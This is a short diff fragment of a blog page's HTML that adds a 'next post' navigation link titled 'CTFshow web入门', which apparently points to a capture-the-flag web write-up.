+                      <a href="/2024/10/25/ctfshowweb%E5%85%A5%E9%97%A8rce/" title="CTFshow web入门">
+                        <span class="hidden-mobile">CTFshow web入门</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
